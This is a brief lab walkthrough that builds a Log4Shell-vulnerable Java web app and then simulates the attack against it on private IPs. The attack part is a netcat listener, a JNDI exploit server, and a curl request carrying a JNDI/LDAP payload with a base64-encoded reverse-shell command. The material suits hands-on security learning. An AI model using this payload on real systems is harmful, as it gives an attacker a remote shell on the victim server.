# Simulate the vulnerable server.
1. Install gradle 7.3.1. 
	1. https://services.gradle.org/distributions/
	2. https://linuxize.com/post/how-to-install-gradle-on-debian-10/ #Change 6.3 for 7.3.1.
2. Create a dir in "/home/gradle/src".
3. Put all the files from the repo: https://github.com/christophetd/log4shell-vulnerable-app

4. Install Java JDK 1.8.0_20. Download from: https://www.oracle.com/es/java/technologies/javase/javase8-archive-downloads.html
	1. For linux 64 bits download: "jdk-8u20-linux-x64.tar.gz"
	2. Extract the content to the Desktop
	3. Add Java JDK to the PATH: export PATH=/home/kali/Desktop/jdk1.8.0_20/bin:$PATH
	4. Check java version: "1.8.0_20" with following command: java -version

6. Go to "/home/gradle/src"
5. Execute gradle bootJar --no-daemon
6. Execute the vulnerable webserver: java -jar .jar

# Simulate the attack
1. Listen with nc in the attacker machine: nc -lvp 4444 -n
2. In the attacker machine download the exploit: https://github.com/welk1n/JNDI-Injection-Exploit
3. Execute the LDAP server: java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.0.2.9 -p 8888
4. Send the following payload to the vulnerable machine:
curl 10.0.2.10:8080 -H 'X-Api-Version: ${jndi:ldap://10.0.2.9:1389/Basic/Command/Base64/bmMgMTAuMC4yLjkgNDQ0NCAtZSAvYmluL2Jhc2g=}'